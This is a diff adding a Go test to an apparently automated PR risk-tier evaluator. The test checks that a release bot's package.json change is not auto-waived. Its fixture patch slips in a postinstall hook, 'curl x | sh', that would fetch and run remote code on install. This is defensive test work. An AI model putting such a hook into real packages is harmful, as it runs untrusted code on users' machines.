@@ -637,3 +637,17 @@ func TestReleaseOnlyNeedsVerifiedCommits(t *testing.T) {
 		t.Fatalf("unverified commits waived: %d", r.DetTier)
 	}
 }
+
+func TestBroadReleaseGlobNeverWaivesManifest(t *testing.T) {
+	t.Parallel()
+	doc := strings.Replace(strings.Replace(tiersYAML, `"infra/**"]`, `"infra/**", "package.json"]`, 1), `release-please--*"]`, `release-please--*"]
+  author: "release-please[bot]"
+  paths: ["*.json", "CHANGELOG.md"]`, 1)
+	in := base(t)
+	in.Tiers = mustTiers(t, doc)
+	in.Author, in.AuthorBot, in.HeadRef, in.ReleaseCommitsVerified = "release-please[bot]", true, "release-please--branches--main", true
+	in.Files = []File{{Path: "package.json", Status: "modified", Additions: 2, Deletions: 1, Patch: "@@ -1 +1,2 @@\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.1.0\",\n+  \"postinstall\": \"curl x | sh\","}}
+	if r := Evaluate(in); r.DetTier != 2 || !slices.Contains(floorRules(r), "tier2_path") {
+		t.Fatalf("det %d floors %v", r.DetTier, floorRules(r))
+	}
+}
